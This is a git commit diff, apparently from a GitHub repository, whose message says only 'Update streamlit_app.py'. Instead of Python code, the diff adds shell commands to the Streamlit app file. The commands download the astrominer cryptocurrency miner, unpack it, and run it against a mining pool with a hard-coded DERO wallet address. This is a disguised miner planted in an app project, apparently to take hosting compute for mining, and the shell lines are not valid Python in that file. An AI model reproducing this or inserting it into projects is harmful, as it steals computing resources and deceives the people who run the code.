5bfe6039e5f57173cd7b347d9a4df90b8861dcb2
buangke24 <157145032+buangke24@users.noreply.github.com>
2024-02-03 21:55:30 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,1 +1,6 @@
 
+wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.1/astrominer-V1.9.1.R2_modern_amd64_linux.tar.gz
+tar -xf astrominer-V1.9.1.R2_modern_amd64_linux.tar.gz
+cd astrominer
+./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xep7fa6qj7pe9xs3uf8dn -r community-pools.mysrv.cloud:10300 -p rpc
+
